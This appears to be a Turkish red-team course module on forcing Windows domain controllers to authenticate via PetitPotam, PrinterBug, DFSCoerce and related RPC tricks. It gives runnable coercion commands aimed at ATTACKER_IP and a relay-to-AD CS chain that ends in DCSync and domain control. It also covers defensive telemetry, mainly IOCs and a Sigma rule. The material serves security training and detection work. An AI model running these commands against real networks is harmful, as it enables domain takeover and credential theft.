## 1. Kavramsal Temel — Neden Var?

[NTLM Relay](./08.1_NTLM_Relay_Senaryolari.md) çalışmak için bir **kurbanın sana kimlik doğrulaması** gerekir. Poisoning (LLMNR/NBT-NS) rastgele/şanslı trafiğe dayanır — kimin, ne zaman auth edeceğini kontrol edemezsin. **Koersiyon (coercion)** bu belirsizliği ortadan kaldırır: Windows'un **imzasız, kimlik doğrulama gerektiren RPC çağrılarını** kötüye kullanarak, seçtiğin bir sunucuyu (**özellikle Domain Controller'ı**) *senin belirlediğin hedefe, senin belirlediğin anda* makine hesabıyla (`DC01$`) kimlik doğrulamaya **zorlarsın**.

**Analoji:** Poisoning, otoyol kenarında otostop beklemektir — kim durursa. Koersiyon, birinin telefonunu arayıp "Hemen şu adrese gel" demektir; hedefi ve zamanı sen seçersin. Üstelik gelen kişi **DC'nin kendisidir** (`DC01$` makine hesabı), ki bu hesap domain'de son derece ayrıcalıklıdır.

**Neden bu kadar güçlü:** Bir DC'yi koersiyonla AD CS Web Enrollment'a relay edersen ([ESC8](./08.3_Relay_AD_CS_ESC8_Zinciri.md)), `DC01$` adına sertifika alır → PKINIT → DC hash → **DCSync** → domain hakimiyeti. Tek bir imzasız RPC çağrısı, kurumsal domain'i düşürür. Bu yüzden koersiyon, modern AD saldırı zincirlerinin **omurgasıdır**.

## 2. Teknik Derinlik — Koersiyon Vektörleri (RPC arayüzleri)

Her koersiyon tekniği, farklı bir **MS-RPC arayüzündeki** "sana bir UNC yoluna bağlan" diyen fonksiyonu istismar eder. Ortak nokta: fonksiyon, **çağıranın erişim yetkisini** bir UNC yoluna (`\\attacker\share`) erişerek doğrular ve bu erişim **makine hesabı bağlamında NTLM auth** üretir.

```
 SALDIRGAN                         HEDEF (DC01)
    │  RPC çağrısı: "\\attacker\x'e bağlan" →  │  ← imzasız RPC (MS-EFSRPC / MS-RPRN / MS-DFSNM)
    │                                          │
    │  ← \\attacker\x  SMB/HTTP auth (DC01$)   │  ← DC makine hesabıyla kimlik doğrular
    │                                          │
    ▼ ntlmrelayx bu auth'u yakalar → hedefe relay eder
```

| Teknik | RPC Arayüzü | Fonksiyon | Yama / Not |
|---|---|---|---|
| **PetitPotam** | MS-EFSRPC (Encrypting FS) | `EfsRpcOpenFileRaw` vb. | CVE-2021-36942; yama bir fonksiyonu kapattı, alternatifler açık |
| **PrinterBug** | MS-RPRN (Print Spooler) | `RpcRemoteFindFirstPrinterChangeNotificationEx` | Spooler servisi açıksa çalışır; kapatmak azaltır |
| **DFSCoerce** | MS-DFSNM (DFS Namespace) | `NetrDfsAddStdRoot` / `NetrDfsRemoveStdRoot` | DFS servisi DC'de her zaman açık — yaması zor |
| **ShadowCoerce** | MS-FSRVP (Shadow Copy) | `IsPathSupported` | VSS provider açıksa |
| **AuthIP/WebDAV** | — | WebClient servisi | **HTTP auth** üretir → LDAP relay için ideal |

**Kritik ayrım — SMB vs HTTP auth:** PetitPotam/PrinterBug varsayılan olarak **SMB** üzerinden auth üretir; SMB imzalama zorlanmış DC'ye LDAP relay zordur. Ama hedefte **WebClient servisi** çalışıyorsa (`\\attacker@80\...` veya WebDAV pipe), auth **HTTP** olur → imzasız → LDAP/AD CS relay serbest. Bu yüzden saldırgan WebClient'ı tetiklemeye (`webclient` başlatma) veya HTTP koersiyon (`-pipe`, `@80` UNC) kullanmaya çalışır.

**PetitPotam yama sonrası:** CVE-2021-36942 sadece `EfsRpcOpenFileRaw` fonksiyonuna anonim erişimi kapattı. `EfsRpcEncryptFileSrv`, `EfsRpcAddUsersToFile` gibi ~15 alternatif fonksiyon kimlik doğrulamalı bağlamda hâlâ tetiklenebilir → `PetitPotam.py -pipe all`.

**Named pipe seçimi ve erişim (derin bakış):** MS-EFSRPC iki pipe üzerinden erişilebilir: `\PIPE\lsarpc` ve `\PIPE\efsrpc`. Yama, `lsarpc` üzerinden **anonim** çağrıyı engelledi ama `efsrpc` pipe'ı (ve kimlik doğrulamalı `lsarpc`) açık kaldı. `-pipe all`, tetiklenebilir tüm pipe+fonksiyon kombinasyonlarını sırayla dener. UNC formatı hedefi belirler:
```
 \\ATTACKER\share        → SMB auth (445)      → SMB imzalama korur
 \\ATTACKER@80\share     → WebDAV/HTTP auth    → imzasız → LDAP/ESC8 relay
 \\ATTACKER@SSL@443\...  → HTTPS WebDAV        → EPA yoksa relay
```
**WebClient servisi ön koşulu:** HTTP koersiyon için hedefte **WebClient** servisi çalışıyor olmalı (DC'lerde varsayılan kapalı, iş istasyonlarında sık açık). Kapalıysa saldırgan önce `SearchConnector`/`.searchms` dosyasıyla veya PushSubscription ile WebClient'ı uzaktan başlatmaya çalışır (`nxc smb -M webdav` ile tespit).

**Neden DFSCoerce en tehlikelisi:** MS-DFSNM'nin `NetrDfsAddStdRoot`/`NetrDfsRemoveStdRoot` fonksiyonları **domain admin** yetkisi kontrol eder ama **çağrı sırasında** UNC yoluna erişerek auth üretir; DFS servisi **her DC'de zorunlu çalışır** ve kapatılamaz. Spooler kapatılabilir, EFSRPC yamalanabilir; DFSNM ise ancak **RPC filtresi** (Blue) ile durdurulur → [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md).

## 3. Pratik Uygulama — Çok Araçlı

**A) PetitPotam (Impacket / dperras):**
```bash
# DC01'i saldırgana auth etmeye zorla (kimlik doğrulamalı, yama sonrası fonksiyonlar)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC01_IP
# Anonim deneme (yamasız DC):
python3 PetitPotam.py ATTACKER_IP DC01_IP
# HTTP koersiyon (LDAP/ESC8 relay için WebDAV):
python3 PetitPotam.py -pipe all ATTACKER_IP@80/pwn DC01_IP
```

**B) PrinterBug (dementor / SpoolSample / NetExec):**
```bash
python3 dementor.py -u user -p pass -d corp.local ATTACKER_IP DC01_IP   # MS-RPRN
nxc smb DC01 -u user -p pass -M spooler                                 # Spooler açık mı?
Get-SpoolStatus -ComputerName DC01                                      # (PowerShell kontrol)
```

**C) DFSCoerce (Wael/Fortra):**
```bash
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC01_IP  # MS-DFSNM
```

**D) Coercer (hepsini tarayan çok-vektörlü araç):**
```bash
# Hangi RPC vektörlerinin tetiklenebilir olduğunu otomatik dener
coercer coerce -u user -p pass -d corp.local -l ATTACKER_IP -t DC01_IP
coercer scan   -u user -p pass -d corp.local -t DC01_IP   # savunmasız fonksiyonları listele
```

**Gerçek-dünya zinciri (koersiyon → domain admin):**
```
DFSCoerce -t DC01 -l ATTACKER   ──▶  DC01$ auth (SMB/HTTP)
        │                                     │
        ▼                                     ▼
   ntlmrelayx -t http://CA/certsrv (ESC8) ──▶ DC01$ sertifikası
        │                                     │
        ▼                                     ▼
   certipy auth (PKINIT) ──▶ DC01$ TGT/hash ──▶ secretsdump DCSync ──▶ krbtgt ──▶ Golden
```

**E) WebClient servisini uzaktan tetikleme (HTTP koersiyon için):**
```bash
# WebClient açık mı kontrol + tetikleme
nxc smb 10.0.0.0/24 -u user -p pass -M webdav          # açık hostları listele
# .searchConnector-ms / PushSubscription ile başlatma (dosya paylaşımına bırak)
```

**Örnek çıktı:**
```
[-] Connecting to ncacn_np:DC01[\PIPE\netdfs]
[+] Successfully bound to MS-DFSNM
[*] Calling NetrDfsRemoveStdRoot...
[*] SMBD-Thread-3: Connection from CORP/DC01$ controlled, relaying...
```

**Coercer scan çıktısı (savunmasız fonksiyon keşfi):**
```
[+] MS-EFSRPC     EfsRpcOpenFileRaw       (2) ERROR_BAD_NETPATH  → tetiklenebilir
[+] MS-DFSNM      NetrDfsAddStdRoot       (2) ERROR_BAD_NETPATH  → tetiklenebilir
[-] MS-RPRN       RpcRemoteFindFirst...   Spooler kapalı         → yok
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| PetitPotam (MS-EFSRPC) | **T1187** (Forced Authentication) | EFSRPC RPC çağrısı; DC'den saldırgana giden SMB; 5145 IPC$ | [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |
| PrinterBug (MS-RPRN) | T1187 | Spooler RPC; `\PIPE\spoolss` bağlantısı | [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |
| DFSCoerce (MS-DFSNM) | T1187 | `\PIPE\netdfs` bağlantısı; NetrDfsAddStdRoot | [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |

**OPSEC notları:**
- **En net iz:** DC makine hesabının (`DC01$`) **saldırgan IP'sine giden** SMB/HTTP bağlantısı. DC'ler normalde rastgele iş istasyonlarına *çıkış* auth'u yapmaz. Blue tarafı bunu ağ akışı + 4624 (kaynak IP) ile avlar.
- **Named pipe telemetrisi:** `\PIPE\lsarpc`, `\PIPE\efsrpc`, `\PIPE\spoolss`, `\PIPE\netdfs` erişimleri Sysmon (Event 18) ile izlenir → seçtiğin pipe iz bırakır.
- **Azaltma:** Spooler'ı kapatmak PrinterBug'ı öldürür ama DFSCoerce/PetitPotam kalır — bu yüzden **savunma imzalama+EPA'ya kayar** (relay'i kırmak, koersiyonu değil). Saldırgan olarak imzalama zorlanmış ortamda koersiyon tek başına işe yaramaz.
- Tetikleme sonrası relay penceresi çok kısa → koersiyon ve ntlmrelayx eşzamanlı çalışmalı.

## 5. Doğrulama / Lab

```bash
# Atomic-benzeri lab: DC (yamasız), saldırgan (relay+coerce)
# 1) impacket-ntlmrelayx -t http://ca01/certsrv/certfnsh.asp --adcs --template DomainController
# 2) python3 PetitPotam.py -pipe all ATTACKER@80/x DC01   (HTTP koersiyon)
# 3) DC01$ sertifikasının relay'de yakalandığını doğrula
# Blue doğrulama (pipe erişimi):
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=18} |
  Where-Object { $_.Message -match 'efsrpc|spoolss|netdfs' }
```

**Sigma kuralı (koersiyon named-pipe erişimi):**
```yaml
title: Coercion via Named Pipe (EFSRPC / Spooler / DFSNM)
logsource: { product: windows, category: pipe_connected }   # Sysmon EID 18
detection:
  selection:
    PipeName|contains:
      - '\efsrpc'      # PetitPotam
      - '\lsarpc'      # PetitPotam (lsarpc yolu)
      - '\spoolss'     # PrinterBug
      - '\netdfs'      # DFSCoerce
      - '\FssagentRpc' # ShadowCoerce
  filter_dc2dc: { SourceIp: '%DomainControllerSubnet%' }
  condition: selection and not filter_dc2dc
level: high
```

**Doğrulama — DC'nin dışarı auth'unu yakalama (ağ tarafı):**
```bash
# Saldırgan tarafında Responder/ntlmrelayx log'unda DC01$ auth görünmeli:
#   [*] SMBD: Connection from CORP/DC01$ ...  ← koersiyon başarılı
# Blue tarafı: DC'nin bir iş istasyonu IP'sine giden SMB/HTTP akışı (netflow) = anomali
```
Koersiyon başarısıysa (yama/RPC filtresi), araç `rpc_s_access_denied` veya bağlantı hatası döner — bu, [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) önlemlerinin çalıştığının kanıtıdır.
